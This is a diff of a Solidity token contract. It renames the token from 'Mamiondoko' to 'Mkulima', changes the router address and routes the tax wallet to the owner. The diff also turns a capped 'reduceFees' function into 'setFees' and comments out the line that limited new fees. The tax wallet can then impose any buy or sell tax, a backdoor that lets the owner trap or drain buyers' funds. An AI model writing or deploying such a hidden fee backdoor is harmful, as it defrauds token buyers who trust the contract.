@@ -7,6 +7,7 @@ abstract contract Context {
     }
 }
 
+
 interface IERC20 {
     function totalSupply() external view returns (uint256);
     function balanceOf(address account) external view returns (uint256);
@@ -105,7 +106,8 @@ interface IUniswapV2Router02 {
         uint deadline
     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
 }
-contract Mamiondoko is Context , IERC20, Ownable {
+
+contract Mkulima is Context , IERC20, Ownable {
     using SafeMath for uint256;
     mapping (address => uint256) private _balances;
     mapping (address => mapping (address => uint256)) private _allowances;
@@ -126,8 +128,8 @@ contract Mamiondoko is Context , IERC20, Ownable {
 
     uint8 private constant _decimals = 9;
     uint256 private constant _tTotal = 1000000000 * 10**_decimals;
-    string private constant _name = unicode"MAMIONDOKO";
-    string private constant _symbol = unicode"$MDK";
+    string private constant _name = unicode"Mkulima";
+    string private constant _symbol = unicode"$MKUU";
     uint256 public _maxTxAmount = 20000000 * 10**_decimals;
     uint256 public _maxWalletSize = 20000000 * 10**_decimals;
     uint256 public _taxSwapThreshold= 10000000 * 10**_decimals;
@@ -147,7 +149,7 @@ contract Mamiondoko is Context , IERC20, Ownable {
     }
 
     constructor () {
-        _taxWallet = payable(_msgSender());
+        _taxWallet = payable(owner());
         _balances[_msgSender()] = _tTotal;
         _isExcludedFromFee[owner()] = true;
         _isExcludedFromFee[address(this)] = true;
@@ -300,19 +302,19 @@ contract Mamiondoko is Context , IERC20, Ownable {
 
     function openTrading() external onlyOwner() {
         require(!tradingOpen,"trading is already open");
-        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         _approve(address(this), address(uniswapV2Router), _tTotal);
-        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
-        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
+        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()); //
+        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),1,1,owner(),block.timestamp);//
         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
         swapEnabled = true;
         tradingOpen = true;
     }
 
     
-    function reduceFees(uint256 _newFee) external{
-      require(_msgSender()==_taxWallet);
-      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
+    function setFees(uint256 _newFee) external {
+     require(_msgSender()==_taxWallet);
+      //require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
       _finalBuyTax=_newFee;
       _finalSellTax=_newFee;
     }
